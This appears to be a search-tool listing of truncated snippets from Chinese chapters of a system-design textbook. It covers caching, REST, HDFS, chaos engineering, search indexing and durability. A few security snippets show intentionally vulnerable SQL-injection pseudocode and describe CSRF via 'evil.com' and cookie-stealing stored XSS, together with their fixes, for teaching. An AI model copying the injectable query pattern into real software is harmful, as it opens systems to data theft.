  c26_b08.md: ...什么是 hinted handoff，在什么条件下它保持数据可用性但不保持数据一致性？  **答案：** Hinted handoff：当某键的标准节点 A 不可用时，邻近节点 B 临时存储本该给 A 的值，元数据中“hint”该值属于 A。A 恢复后，...
  c26_b08.md: ...int”该值属于 A。A 恢复后，B 把 hinted 数据转发给 A（handoff）并丢弃自己的副本。Hinted handoff 保持写可用性：即使某些标准节点宕机，写仍成功到 W 个节点。系统报告写成功。但它不保持一致性：若 A 宕机时读到达，且...
  c26_b08.md: ...int 持有最新值）得到正确值。结果取决于 R-quorum 联系哪些节点。不一致窗口从 A 恢复持续到 hinted handoff 完成——通常数秒到数分钟。  **Q4.** Merkle tree 如何实现高效的副本比较？为什么比比较所有键值对更...
  c26_b10.md: ...是节点 A，preference list 是 [A, B, C]。追踪 sloppy quorum 加 hinted handoff 下该写的去向。然后追踪后续读 `GET("user:101:timeline")` 在 R=1 下的去向。读有哪些可能...
  c26_b10.md: ...个节点。可能结果：(1) 读路由到节点 A 或 B：返回 `new_value`——最新写。(2) 读在 hinted handoff 完成前路由到节点 C：C 仍有旧值。返回 `old_value`——陈旧，但系统不知道是陈旧的。(3) 读在 hint...
  c26_b10.md: ...前路由到节点 C：C 仍有旧值。返回 `old_value`——陈旧，但系统不知道是陈旧的。(3) 读在 hinted handoff 后路由到节点 C：返回 `new_value`。决定结果的因素：负载均衡器的节点选择、分区恢复时机、hinted ha...
  c26_b10.md: ...ff 后路由到节点 C：返回 `new_value`。决定结果的因素：负载均衡器的节点选择、分区恢复时机、hinted handoff 传播速度。这就是最终一致性的本质：系统会收敛，但在收敛窗口期间读可能返回陈旧值。  **Q2.** 为 SocialS...
  c26_b13.md: ...1 章）适用：任何节点可处理任何请求，使系统无状态且可扩展。Reliability（第 16–19 章）：Hinted handoff 是可靠性机制——类似第 16 章优雅降级模式。节点故障时系统优雅降级：通过 sloppy quorum 写仍成功，并通...
  c26_b13.md: ...不同数据类型使用不同 N/W/R 配置，反映它们不同的一致性需求。  **Sloppy quorum 加 hinted handoff** 优先写可用性：写总是成功到 W 个可用节点，hinted 数据在标准节点恢复后转发。  **Merkle tree...
  c28_b14.md: ...| 极低（前缀键查找） | 最终（空间索引异步更新） | 高 | 低 **Sloppy quorum + hinted handoff** (Ch 26) | 低（写到任意 W 节点） | 最终（标准节点可能未最新） | 极高（写总是成功） | 中 **...

=== get (21 occurrences) ===
  c06_b03.md: ...你通过 key 取回它。       SET user:1:session_token "abc123xyz"     GET user:1:session_token → "abc123xyz"      SET post:101:like_c...
  c07_b07.md: ..._id}:profile"          # Check cache         cached = redis.get(cache_key)         if cached:             return json.loads...
  c09_b01.md: ...手协商加密密钥。这增加 1–2 次往返延迟。  **第 4 步：HTTP 请求。** 浏览器通过加密连接发送 HTTP GET 请求。  **第 5 步：路由到应用。** 浏览器连接的 IP 地址不一定是单个应用服务器。它可能是负载均衡器的 IP...
  c09_b08.md: ...动词（GET、POST、PUT、DELETE、PATCH）对由 URL 标识的资源表达 CRUD 操作。       GET  /users/42                   → fetch user 42     POST /user...
  c09_b08.md: ...TP 客户端都能消费 REST API，无需特殊工具 * 人类可读（URL 描述性强，JSON 可检查） * 可缓存——GET 请求可在任何层缓存（CDN、浏览器、代理） * 适合外部开发者会消费的公共 API  **REST 的缺点：**  *...
  c09_b08.md: ...*  **过度取回（Over-fetching）：** REST 端点返回完整资源。如果你只需要用户名和头像 URL，`GET /users/42` 会返回所有字段（简介、邮箱、粉丝数、加入日期等）。额外字段浪费带宽。  **取回不足（Under...
  c09_b08.md: ...）：** 一个页面可能需要多个资源的数据。要展示 Alice 的资料页（含最近帖子和粉丝数），你可能需要：       GET /users/42           → Alice's profile     GET /users/42/pos...
  c09_b08.md: ...，你可能需要：       GET /users/42           → Alice's profile     GET /users/42/posts     → Alice's recent posts     GET /users/4...
  c09_b08.md: ...file     GET /users/42/posts     → Alice's recent posts     GET /users/42/followers → Alice's follower count   三个独立 HTTP 请求...
  c09_b15.md: ...sence:{user_id} 的 TTL。返回 200。       → 活跃客户端每 30 秒调用一次。      GET /api/users/{user_id}/presence       → 返回 { "online": true/f...
  c11_b04.md: ...n_id      def get_session(session_id):         data = redis.get(f"session:{session_id}")         if data is None:...
  c11_b13.md: ...ey = f"user:{user_id}:profile"         cached = local_cache.get(cache_key)  # 进程内 Python dict（TTL 300 秒）         if cached:...
  c11_b14.md: ...ache_key = f"user:{user_id}:profile"         cached = redis.get(cache_key)          # 共享 Redis，不是本地 dict         if cached:...
  c11_b15.md: ...e_key = f"presigned:{user_id}:photo"         cached = redis.get(cache_key)         if cached:             return cached.dec...
  c17_b06.md: ...Trace ID: abc123       [0ms - 245ms]  API Gateway: handle GET /feed         [5ms - 20ms]   Auth Service: validate_jwt (15...
  c17_b06.md: ...d Service: get_feed (218ms)           [25ms - 50ms]  Redis: get cached_feed (25ms) → MISS           [52ms - 200ms] Post Ser...
  c17_b06.md: ...Trace ID: abc123       [0ms - 245ms]  API Gateway: handle GET /feed         [5ms - 20ms]   Auth Service: validate_jwt (15...
  c17_b06.md: ...d Service: get_feed (218ms)           [25ms - 50ms]  Redis: get cached_feed (25ms) → MISS           [52ms - 200ms] Post Ser...
  c19_b06.md: ...5 章：关系型数据库解释 SQL 查询。考虑这段代码（伪代码）：       user_input = request.get("username")     query = f"SELECT * FROM users WHERE usernam...
  c19_b07.md: ...ocialSnap 用户访问 `evil.com` 时，浏览器加载这个“图片”——实际上是向 SocialSnap 发 GET 请求。SocialSnap 看到带有有效会话 cookie 的请求（浏览器自动发送）并删除帖子 12345。  修复方...
  c22_b13.md: ...t`。500 万（5 million）并发用户时，约 10 万（100,000）RPS——但每个请求是一次 Redis GET（约 1ms），完全可行。相比之下，以 10 万 RPS 轮询完整 feed 组装，需要 100,000 × 20 次数...

=== hdfs (21 occurrences) ===
  c10_b07.md: ...从对象存储获取照片——但只在过期前。这保留了“直接从对象存储服务”的性能收益，同时执行访问控制。   ### 10.6 HDFS——大数据的分布式文件存储  为完整起见，存储全景还包括为特定问题设计的另一种类型：**HDFS（Hadoop Dist...
  c10_b07.md: ...### 10.6 HDFS——大数据的分布式文件存储  为完整起见，存储全景还包括为特定问题设计的另一种类型：**HDFS（Hadoop Distributed File System）**。   #### 定义：HDFS  **HDFS**...
  c10_b07.md: ...计的另一种类型：**HDFS（Hadoop Distributed File System）**。   #### 定义：HDFS  **HDFS** 是一种分布式文件系统，设计用来在许多普通服务器上存储非常大的文件（每个 GB 到 TB 级），并支...
  c10_b07.md: ...**HDFS（Hadoop Distributed File System）**。   #### 定义：HDFS  **HDFS** 是一种分布式文件系统，设计用来在许多普通服务器上存储非常大的文件（每个 GB 到 TB 级），并支持高吞吐顺序读。...
  c10_b07.md: ...是一种分布式文件系统，设计用来在许多普通服务器上存储非常大的文件（每个 GB 到 TB 级），并支持高吞吐顺序读。  HDFS 围绕一个特定假设设计：工作负载涉及顺序读取整个大文件（例如处理 100 GB 日志文件以提取统计信息），而不是对许多文...
  c10_b07.md: ...理 100 GB 日志文件以提取统计信息），而不是对许多文件的小部分随机访问。对这种工作负载模式——在数据分析中常见——HDFS 的设计高度优化。  **HDFS 设计原则：**  **大文件块大小：** HDFS 使用 128 MB 或 256...
  c10_b07.md: ...计信息），而不是对许多文件的小部分随机访问。对这种工作负载模式——在数据分析中常见——HDFS 的设计高度优化。  **HDFS 设计原则：**  **大文件块大小：** HDFS 使用 128 MB 或 256 MB 的块大小（传统文件系统通常是...
  c10_b07.md: ...作负载模式——在数据分析中常见——HDFS 的设计高度优化。  **HDFS 设计原则：**  **大文件块大小：** HDFS 使用 128 MB 或 256 MB 的块大小（传统文件系统通常是 4 KB）。1 GB 文件只存为 4–8 个块。这...
  c10_b07.md: ...久性：** 每个块默认复制到三个节点。如果一个节点故障，数据仍可在另外两个节点上获取。  **一次写入、多次读取：** HDFS 不支持原地更新。文件写入一次，然后只读。这种简化实现高吞吐。  **数据本地性：** 计算（MapReduce 或 S...
  c10_b07.md: ...或 Spark 作业）在与数据相同的节点上运行。不是把数据移到计算，而是把计算移到数据，消除大数据集的网络瓶颈。  **HDFS 适用场景：** 大数据分析管道。一家公司把 10 TB 每日用户事件日志存在 HDFS 中。 nightly Spar...
  c10_b07.md: ...消除大数据集的网络瓶颈。  **HDFS 适用场景：** 大数据分析管道。一家公司把 10 TB 每日用户事件日志存在 HDFS 中。 nightly Spark 作业读取整个数据集以生成推荐。一次读取、高吞吐模式正是 HDFS 所优化的。  **...
  c10_b07.md: ...日用户事件日志存在 HDFS 中。 nightly Spark 作业读取整个数据集以生成推荐。一次读取、高吞吐模式正是 HDFS 所优化的。  **HDFS 不适用场景：** 随机访问工作负载（按 ID 查找一条记录）、小文件工作负载（HDFS 的...
  c10_b07.md: ...中。 nightly Spark 作业读取整个数据集以生成推荐。一次读取、高吞吐模式正是 HDFS 所优化的。  **HDFS 不适用场景：** 随机访问工作负载（按 ID 查找一条记录）、小文件工作负载（HDFS 的大块大小对 1 KB 文件浪...
  c10_b07.md: ...记录）、小文件工作负载（HDFS 的大块大小对 1 KB 文件浪费），或对延迟敏感的应用。  对 SocialSnap，HDFS 不是头像照片的正确选择（随机访问、小文件）。但如果 SocialSnap 后来在其用户事件流（点击、浏览、点赞）上构建...
  c10_b07.md: ...选择（随机访问、小文件）。但如果 SocialSnap 后来在其用户事件流（点击、浏览、点赞）上构建 PB 级分析管道，HDFS 或云等价物（Amazon S3 用作 Spark 作业的类 HDFS 对象存储）就会变得相关。...
  c10_b07.md: ...件流（点击、浏览、点赞）上构建 PB 级分析管道，HDFS 或云等价物（Amazon S3 用作 Spark 作业的类 HDFS 对象存储）就会变得相关。...
  c10_b08.md: ...### 10.7 数据本地性——把计算移到数据  HDFS 关于数据本地性的洞察是一个值得单独审视的通用原则。  在典型 Web 请求中，数据流动如下：  1. 请求到达应用服务...
  c10_b10.md: ...**  * 按键随机访问（用户 ID、帖子 ID）→ 关系型数据库或键值存储 * 顺序大读取（日志分析）→ 对象存储或 HDFS * 分层目录结构、多写入者 → 文件存储（NFS） * 大二进制 blob（图片、视频、文档）→ 对象存储  **第...
  c10_b10.md: ...B，数百万记录 → 关系型数据库 * 大文件（MB 到 GB），数量任意 → 对象存储 * 超大文件，分析工作负载 → HDFS  **第 3 步：需要多低延迟？**  * 亚毫秒级（缓存）→ DRAM（Redis、Memcached） * 个位数...
  c10_b10.md: ...维）   对象存储 | ↑ 50-100ms | ↑（2020 年后强一致） | ↑↑（多区） | ↓（托管服务）   HDFS | ↑ 高吞吐、高延迟 | ↔（一次写入） | ↑（复制） | ↑↑（集群管理）   冷归档 | ↑↑↑ 分钟-小时...
  c10_b19.md: ...-value 命名空间，实际上无限扩展、高持久性、每字节低成本。它是用户上传媒体、大数据集和备份的正确存储层级。  **HDFS** 优化分布式分析管道中的大文件顺序读取——大块大小、一次写入语义和计算的数据本地性。  **SocialSnap 的...

=== staging (20 occurrences) ===
  c16_b10.md: ...试故障  你怎么知道熔断器有效？你怎么知道回退策略正确实现？你怎么知道故障转移在 30 秒内完成？  你测试它们。不在 staging 环境，也不等待生产故障——在生产环境故意测试。  这就是**混沌工程（chaos engineering）**：故意向...
  c16_b17.md: ...断器配置正确。相信故障转移在 30 秒内完成。在生产中测试之前，这些都是信念，不是经过验证的事实。配置错误、过时的假设、staging 环境无法揭示的边界情况，意味着故障转移机制的第一次“真实”测试就是失控生产失败。  Netflix 的发现：Chaos...
  c18_b03.md: ...“系统在持续负载下会稳定还是渐进降级？” * “瓶颈在哪里——CPU、数据库连接、网络带宽还是其他？”  负载测试在 staging 环境（镜像生产架构但使用较小实例和测试数据）上运行真实流量模式。Locust、k6 或 Apache JMeter 等...
  c18_b05.md: ...列深度是多少？这是基线；只有知道基线，你才能发现混沌引入的偏差。这直接关联第 17 章的可观测性工作。 2. **先在 staging**——不要在生产开始混沌实验。先在安全环境学习架构是否真的如设计那样容忍失败。 3. **定义爆炸半径**——每个实验...
  c18_b05.md: ...都应能立即停止。实验期间应有人盯着监控，准备在看到比预期更糟时停止。 5. ** graduated 到生产**——对 staging 中已证明能处理的特定失败建立信心后，在低流量时段在生产运行相同实验。目标是持续验证生产的实际弹性是否匹配设计的理论弹性...
  c18_b12.md: ...开关是关键安全机制：它允许无需部署即即时回滚，并把代码部署与用户可见发布分离。  **Q2.** SocialSnap staging 环境的一次混沌实验揭示：当 Auth Service 被 kill 并重启时，Feed Service 在 Auth...
  c18_b14.md: ...失败模式；(b) 系统已有良好可观测性（第 17 章）和熔断器（第 16 章），受控实验可以快速停止；(c) 团队先在 staging 实验，只把理解充分的失败模式 graduated 到生产。  综合：混沌工程不是“故意制造 outage”。做好时，它...
  c18_b14.md: ...让潜在失败在成为意外事件前浮出水面。  对大多数服务用户的生产系统（非生命安全），graduated 混沌工程——先在 staging、后在低流量时段生产，配合优秀可观测性——既负责任又有价值。  **Q2.** 功能开关将代码部署与功能发布分离。这很强...
  c28_b04.md: ...慢查询每个连接持有 60 秒（60 seconds）。 * 为什么？数据库索引被迁移脚本删除。 * 为什么？迁移脚本在 staging 测试过，但 staging 数据集更小，所以查询跑得很快。 * 为什么？Staging 和生产数据量不同；查询计划行为...
  c28_b04.md: ...（60 seconds）。 * 为什么？数据库索引被迁移脚本删除。 * 为什么？迁移脚本在 staging 测试过，但 staging 数据集更小，所以查询跑得很快。 * 为什么？Staging 和生产数据量不同；查询计划行为不同。  **根本原因：**...
  c28_b04.md: ...删除。 * 为什么？迁移脚本在 staging 测试过，但 staging 数据集更小，所以查询跑得很快。 * 为什么？Staging 和生产数据量不同；查询计划行为不同。  **根本原因：** Staging 环境不能反映生产数据量，导致性能差异未被发...
  c28_b04.md: ...数据集更小，所以查询跑得很快。 * 为什么？Staging 和生产数据量不同；查询计划行为不同。  **根本原因：** Staging 环境不能反映生产数据量，导致性能差异未被发现。  **行动项：** 用生产代表性数据量加载 staging；添加查询性...
  c28_b04.md: ...原因：** Staging 环境不能反映生产数据量，导致性能差异未被发现。  **行动项：** 用生产代表性数据量加载 staging；添加查询性能回归测试。  五个为什么是侦探纪律（Thread C）应用于系统失败：沿着连续原因追踪证据，直到找到真正起...
  c28_b04.md: ...慢查询每个连接持有 60 秒（60 seconds）。 * 为什么？数据库索引被迁移脚本删除。 * 为什么？迁移脚本在 staging 测试过，但 staging 数据集更小，所以查询跑得很快。 * 为什么？Staging 和生产数据量不同；查询计划行为...
  c28_b04.md: ...（60 seconds）。 * 为什么？数据库索引被迁移脚本删除。 * 为什么？迁移脚本在 staging 测试过，但 staging 数据集更小，所以查询跑得很快。 * 为什么？Staging 和生产数据量不同；查询计划行为不同。  **根本原因：**...
  c28_b04.md: ...删除。 * 为什么？迁移脚本在 staging 测试过，但 staging 数据集更小，所以查询跑得很快。 * 为什么？Staging 和生产数据量不同；查询计划行为不同。  **根本原因：** Staging 环境不能反映生产数据量，导致性能差异未被发...
  c28_b04.md: ...数据集更小，所以查询跑得很快。 * 为什么？Staging 和生产数据量不同；查询计划行为不同。  **根本原因：** Staging 环境不能反映生产数据量，导致性能差异未被发现。  **行动项：** 用生产代表性数据量加载 staging；添加查询性...
  c28_b04.md: ...原因：** Staging 环境不能反映生产数据量，导致性能差异未被发现。  **行动项：** 用生产代表性数据量加载 staging；添加查询性能回归测试。  五个为什么是侦探纪律（Thread C）应用于系统失败：沿着连续原因追踪证据，直到找到真正起...
  c28_b22.md: ...s_user_id_created_at_idx`），且迁移没有交叉引用生产查询计划。为什么？SocialSnap 的 staging 环境没有运行 `EXPLAIN ANALYZE` 回归测试；迁移只测试了语法正确性，没测试查询计划影响。根本原因：CI...
  c28_b22.md: ...YZE` 回归测试；迁移只测试了语法正确性，没测试查询计划影响。根本原因：CI/CD 流水线中没有自动查询计划回归测试；staging 无法验证关键索引查询在迁移后仍高效。post-mortem 行动项：(1) **在 CI/CD 中添加查询计划回归测试...

=== systems (20 occurrences) ===
  c23_b01.md: ...索系统时，系统支付索引成本：读取文档、提取每个有意义的词，并记录哪些文档包含该词。然后用户搜索“distributed systems consistency（分布式系统 一致性）”时，搜索引擎不会扫描数十亿文档。它查三个词在预计算表中的倒排列表并求交集...
  c23_b04.md: ...引。让我们理解为什么。  假设有四份文档：  Doc ID | 内容 ---|--- 1 | "distributed systems（分布式系统） are hard" 2 | "systems design requires tradeoffs" 3...
  c23_b04.md: ...| 内容 ---|--- 1 | "distributed systems（分布式系统） are hard" 2 | "systems design requires tradeoffs" 3 | "distributed computing and c...
  c23_b04.md: ...）" 4 | "design patterns for reliability"  用户搜索 "distributed systems（分布式系统）"。朴素做法是扫描全部四份文档，找包含两个词的。4 份文档时这微不足道。100 亿（10 billion）...
  c23_b04.md: ...Word | Posting List（Doc IDs） ---|--- distributed | [1, 3] systems | [1, 2] design | [2, 4] hard | [1] consistency | [3] trade...
  c23_b04.md: ...tency | [3] tradeoffs | [2] reliability | [4]  "distributed systems" 的查询变成：取 "distributed" 的 posting list = [1, 3]，取 "systems"...
  c23_b04.md: ...d systems" 的查询变成：取 "distributed" 的 posting list = [1, 3]，取 "systems" 的 posting list = [1, 2]，再求交集 = [1]。  两个有序列表的交集操作是 O(n + m)...
  c23_b04.md: ...包含：  * **Term frequency (TF)：** 该词在文档中出现多少次？提到 "distributed systems（分布式系统）" 50 次的文档可能比只提到一次的更相关。 * **Term position：** 词出现在哪些位置（...
  c23_b04.md: ...相关。 * **Term position：** 词出现在哪些位置（词索引）？这支持短语匹配（"distributed systems" 作为精确短语，而非两个分开的词）。 * **Field indicator：** 词在标题、标题栏还是正文中？标题中...
  c23_b05.md: ...Running"、"ran"、"runs" 都可能变成 "run"。这让查询 "running distributed systems（分布式系统）" 能匹配包含 "run distributed system" 的文档。 6. **倒排索引更新：**...
  c23_b05.md: ...数亿页面。   #### 索引分片  没有单机能容纳 100 亿（10 billion）页面的完整倒排索引。常用词如 "systems" 的 posting list 可能包含数亿文档 ID——仅这一个词就几十 GB。整个网页倒排索引是数百 TB。  如...
  c23_b05.md: ...母顺序拥有一段词。分片 1 拥有 A–G 的词；分片 2 拥有 H–P 的词；依此类推。查询 "distributed systems（分布式系统）" 必须命中两个分片（每个词一个），然后求交集。这叫 **term-based sharding**。...
  c23_b05.md: ...按文档分片：** 每个分片拥有所有文档的一个子集，并为其文档子集维护完整的小型倒排索引。查询 "distributed systems" 并行命中所有分片；每个分片返回本地结果；结果合并。这叫 **document-based sharding**。...
  c23_b06.md: ...#### TF-IDF：直觉  回到我们的例子。一份关于 "distributed systems（分布式系统）" 的文档如果提到该短语 50 次，可能非常聚焦该主题。但如果网上每份文档都提到 "systems" 50...
  c23_b06.md: ...ted systems（分布式系统）" 的文档如果提到该短语 50 次，可能非常聚焦该主题。但如果网上每份文档都提到 "systems" 50 次呢？"systems" 太常见，高频几乎不能说明什么。  TF-IDF（Term Frequency - I...
  c23_b06.md: ...统）" 的文档如果提到该短语 50 次，可能非常聚焦该主题。但如果网上每份文档都提到 "systems" 50 次呢？"systems" 太常见，高频几乎不能说明什么。  TF-IDF（Term Frequency - Inverse Document...
  c23_b06.md: ...高的 TF 总意味着更好排名。但 TF 会被文档长度归一化。一份 10,000 词的文档提到 "distributed systems（分布式系统）" 50 次，实际上比一份 200 词提到 5 次的文档对该术语的密度更低。长度归一化防止长文档总是击败短...
  c23_b06.md: ...衡量文档与查询的相关性。但它无法衡量文档是否可信或权威。垃圾页面可以炮制一份文档，每段都提到 "distributed systems（分布式系统）" 500 次，单凭 TF-IDF 会得极高分数。  Larry Page 和 Sergey Brin 原...
  c23_b07.md: ...23.4 查询处理与 Typeahead  用户输入 "dist" 到搜索框，下拉框立即显示 "distributed systems（分布式系统）"、"distance learning"、"distillation"，这是 **typeahead 自...
  c23_b08.md: ...整查询时，流水线如下：  1. **查询处理：** 应用索引时相同的分词、归一化和停用词移除。"Distributed Systems Consistency" 变成 ["distribut", "system", "consist"]（词干提取后）。...

=== html (19 occurrences) ===
  c01_b02.md: ...2)` 函数。 5. 函数向数据库查询第 42 号文章。 6. 数据库返回文章数据。 7. Web 服务器把它格式化成 HTML 并发送回去。 8. 浏览器渲染 HTML。  你的朋友看到了一篇博客文章。但背后有八个不同的系统参与了——浏览器、DN...
  c01_b02.md: ...42 号文章。 6. 数据库返回文章数据。 7. Web 服务器把它格式化成 HTML 并发送回去。 8. 浏览器渲染 HTML。  你的朋友看到了一篇博客文章。但背后有八个不同的系统参与了——浏览器、DNS 基础设施、网络、Web 服务器、应用代...
  c01_b02.md: ...但背后有八个不同的系统参与了——浏览器、DNS 基础设施、网络、Web 服务器、应用代码、数据库、HTTP 协议，以及 HTML 渲染引擎。其中大多数不受你控制。但你要对中间那部分负责。  这就是系统：一条组件链，每个只做自己那一小部分，却共同完成...
  c07_b08.md: ...更新：写入后缓存立即陈旧 * 热门帖子列表：随着新帖子创建和点赞而变陈旧 * 汇率：市场每次变动就变陈旧 * 渲染好的 HTML 页面：当它的任何数据源变化时变陈旧  越难检测陈旧性，失效就越难。对简单实体更新（用户资料、帖子内容），失效很直接：实...
  c07_b12.md: ...求决定。用户头像可能容忍 1 小时 TTL（很少变）。“当前在线用户数”可能需要 10 秒 TTL。静态营销页面的渲染 HTML 可能设 24 小时 TTL。没有通用答案——它永远是一个 tradeoff（权衡）。  **Q4.** 描述惊群问题。...
  c09_b17.md: ...需查找 IP 地址。  2. **CDN 边缘节点完全处理请求。** CDN 有 `/users/alice` 的缓存 HTML 响应。它立即返回。没有请求到达 API 网关，没有请求到达应用服务器，也没有数据库查询。  3. **API 网关被绕...
  c19_b06.md: ...化更快。   #### 跨站脚本（XSS）  SocialSnap 允许用户写帖子。一个幼稚实现直接存储帖子内容并作为 HTML 渲染：       <div class="post">{{ post.content }}</div>   如果用户...
  c19_b06.md: ...?q=<script>...</script>` 使脚本反射回搜索结果页并执行。  修复方法：在渲染用户内容前进行 **HTML 编码（转义）**。`<script>` 变成 `&lt;script&gt;`——浏览器把它显示为字面文本而非执行。现...
  c19_b07.md: ...解是这些漏洞是“已解决的问题”——现代框架自动处理。这部分正确：现代 ORM 默认使用参数化查询，现代模板引擎默认转义 HTML。但开发者仍会通过以下方式引入漏洞：为“方便”使用原始字符串拼接、在想要“渲染 HTML”时明确选择不转义，或认为“我们...
  c19_b07.md: ...数化查询，现代模板引擎默认转义 HTML。但开发者仍会通过以下方式引入漏洞：为“方便”使用原始字符串拼接、在想要“渲染 HTML”时明确选择不转义，或认为“我们使用 JSON 而非 SQL”所以 API 层不会注入。  注入漏洞存在于用户输入到达解...
  c19_b12.md: ...#### 概念检测  **Q1.** 用户加载 SocialSnap 帖子，浏览器将部分帖子内容渲染为 HTML，导致脚本执行。该脚本把用户会话 cookie 发到外部服务器。这是什么类型的攻击，根因是什么？  **答案：** 这是...
  c19_b12.md: ...？  **答案：** 这是**存储型跨站脚本（stored XSS）**攻击。根因是应用把用户生成内容未经转义就渲染为 HTML。帖子作者在他们的帖子内容中提交了 script 标签。当应用直接把这些内容插入 HTML 响应而不转义时，浏览器把它解...
  c19_b12.md: ...用户生成内容未经转义就渲染为 HTML。帖子作者在他们的帖子内容中提交了 script 标签。当应用直接把这些内容插入 HTML 响应而不转义时，浏览器把它解释为可执行 JavaScript 而非显示文本。修复方法是在渲染到 HTML 前转义所有用...
  c19_b12.md: ...这些内容插入 HTML 响应而不转义时，浏览器把它解释为可执行 JavaScript 而非显示文本。修复方法是在渲染到 HTML 前转义所有用户生成内容——把 `<` 转为 `&lt;`、`>` 转为 `&gt;` 等——让浏览器将其视为文本而非...
  c19_b17.md: ...b 漏洞——SQL 注入、XSS、CSRF——都共享一个根因：把用户输入当作可信代码或可信状态。防御措施——参数化查询、HTML 转义、CSRF token——都共享同一原则：把代码与数据分开。  零信任架构放弃边界模型，要求每次服务调用都进行认证...
  c23_b01.md: ...度排序 * 峰值处理 10 万（100,000）QPS 查询量  **约束（证据）：**  * 平均网页约 100KB HTML * 典型英文网页约含 2000 个不同词 * 100 亿（10 billion）页面时，原始 HTML 存储约 1 P...
  c23_b01.md: ...约 100KB HTML * 典型英文网页约含 2000 个不同词 * 100 亿（10 billion）页面时，原始 HTML 存储约 1 PB（petabyte） * 查询流量高度倾斜：最热 1% 查询约占 50% 流量 * 用户期望亚秒结果；...
  c23_b05.md: ...## 索引流水线  构建倒排索引不是单步过程。爬取页面到达后，索引流水线执行多次转换：  1. **解析：** 从原始 HTML 提取干净文本。移除 HTML 标签、JavaScript、CSS。 2. **分词：** 把文本切分成单个 token...
  c23_b05.md: ...引不是单步过程。爬取页面到达后，索引流水线执行多次转换：  1. **解析：** 从原始 HTML 提取干净文本。移除 HTML 标签、JavaScript、CSS。 2. **分词：** 把文本切分成单个 token（词）。 3. **归一化：*...

=== durability (19 occurrences) ===
  c01_b12.md: ...ency（延迟）、throughput（吞吐）、availability（可用性）、consistency（一致性）和 durability（持久性）。它们不只是定义——而是每个架构 tradeoff（权衡）必须被描绘的坐标轴。当你能用这些术语描述一个 tra...
  c02_b04.md: ...AP 定理，我们将在第 4 章学习。现在请记住：**一致性是一个光谱，光谱上的每一点都有代价。**   ### 2.4 Durability——我的数据能活下来吗？  可用性关乎系统是否响应。Durability（持久性）关乎它是否记得。   #### 定义：...
  c02_b04.md: ...谱上的每一点都有代价。**   ### 2.4 Durability——我的数据能活下来吗？  可用性关乎系统是否响应。Durability（持久性）关乎它是否记得。   #### 定义：Durability  **Durability（持久性）** 是数据一...
  c02_b04.md: ...——我的数据能活下来吗？  可用性关乎系统是否响应。Durability（持久性）关乎它是否记得。   #### 定义：Durability  **Durability（持久性）** 是数据一旦写入并被确认，就能在系统故障（崩溃、断电、磁盘故障）后幸存并保持可...
  c02_b04.md: ...可用性关乎系统是否响应。Durability（持久性）关乎它是否记得。   #### 定义：Durability  **Durability（持久性）** 是数据一旦写入并被确认，就能在系统故障（崩溃、断电、磁盘故障）后幸存并保持可检索的保证。  用大白话说：...
  c02_b04.md: ...（backup）：** 定期把数据复制到独立存储，这样即使灾难性故障（数据中心火灾、勒索软件）也能恢复。   #### Durability-Performance 权衡  每个持久性保证都有代价。  每次数据库变更前先写日志会增加延迟。同步地把写复制到三台机...
  c02_b05.md: ...#### 常见误解  Durability 和 consistency 是不同的保证，可以独立组合。一个系统可以：  * **持久但不一致：** 你把每次写都持久...
  c02_b05.md: ...关系型数据库。  关系型数据库的 ACID 属性（Atomicity, Consistency, Isolation, Durability）把多个保证打包在一起——我们将在第 5 章仔细审视它们。   ### 2.5 Partition Tolerance—...
  c02_b05.md: ...tency（延迟）、throughput（吞吐）、availability（可用性）、consistency（一致性）、durability（持久性）——描述的是系统正常运行时的情况。但网络不可靠。消息会丢失。路由器会故障。网线会被意外切断（在大型数据中心里这...
  c02_b05.md: ...#### 常见误解  Durability 和 consistency 是不同的保证，可以独立组合。一个系统可以：  * **持久但不一致：** 你把每次写都持久...
  c02_b05.md: ...关系型数据库。  关系型数据库的 ACID 属性（Atomicity, Consistency, Isolation, Durability）把多个保证打包在一起——我们将在第 5 章仔细审视它们。   ### 2.5 Partition Tolerance—...
  c02_b05.md: ...tency（延迟）、throughput（吞吐）、availability（可用性）、consistency（一致性）、durability（持久性）——描述的是系统正常运行时的情况。但网络不可靠。消息会丢失。路由器会故障。网线会被意外切断（在大型数据中心里这...
  c02_b07.md: ...的教训：链式依赖会乘性放大不可用性。每层的冗余是标准解法。  **Q3.** 解释 consistency（一致性）和 durability（持久性）的区别。分别举一个持久但不强一致、以及强一致但持久性保证有限的系统例子。  **答案：** 一致性是对不同读者...
  c02_b09.md: ...一个银行转账系统。请把六个指标（latency、throughput、availability、consistency、durability、partition tolerance）按对该用例的重要性排序，并说明前三名的理由。  提示  想想牺牲每个指标会发生...
  c02_b09.md: ...每个指标会发生什么。哪种牺牲是灾难性的，哪种只是烦人？  **答案：** 建议排序（对转账系统从最关键到最不重要）：**Durability（持久性） > Consistency（一致性） > Availability（可用性） > Partition Tol...
  c02_b11.md: ...回）。对端到端_操作_ 来说，延迟增加（消费者稍后处理）。所以“延迟”是更好还是更差，取决于你从谁的视角测量。 * **Durability（持久性）：** 只有队列把消息持久化到磁盘时，才增加持久性。内存队列（如某些 Redis 配置）崩溃时会丢失消息。如果...
  c02_b12.md: ...tency（延迟）、throughput（吞吐）、availability（可用性）、consistency（一致性）、durability（持久性）和 partition tolerance（分区容错性）**——是衡量每个架构决策的坐标轴。  没有系统能同时...
  c07_b14.md: ...这个设计是否符合第 5 章讨论的 ACID 属性？它会产生什么故障场景，如何修复？  提示  想想 ACID 中的 D：Durability（持久性）。Redis 进程崩溃时数据会怎样？再想想关注计数是否属于必须持久的数据，还是可以重建。  **答案：** 这...
  c25_b06.md: ...每张信用卡每笔行程只扣一次 * **Atomicity：** 对乘客扣款与给司机账户入账必须同时发生或都不发生 * **Durability：** 事务一旦提交，就经受住后续任何系统故障 * **Correctness：** 计费金额必须严格等于行程价格（距离...

=== select (19 occurrences) ===
  c05_b02.md: ...问题——基于匹配键值把它们的行组合起来。  “给我看 Alice 的所有帖子，连同 Alice 的用户名：”      SELECT users.username, posts.content, posts.created_at     FROM po...
  c05_b02.md: ...查询执行的基础，能解释为什么有些查询快、有些查询灾难性慢。   #### 朴素方法：全表扫描  假设你运行：      SELECT * FROM posts WHERE user_id = 1;  没有任何特殊结构时，数据库读取 `posts` 表的...
  c05_b06.md: ...ing_count` 是**反规范化计数器（denormalized counters）**——这个计数本来可以通过 `SELECT COUNT(*) FROM follows WHERE followed_id = user_id` 推导，但规模上去...
  c05_b06.md: ...b？” 能快速查找。  **主页 Feed 查询**——“给 Alice 看她关注的人最近 20 条帖子”：      SELECT posts.id, posts.content, posts.created_at, users.username...
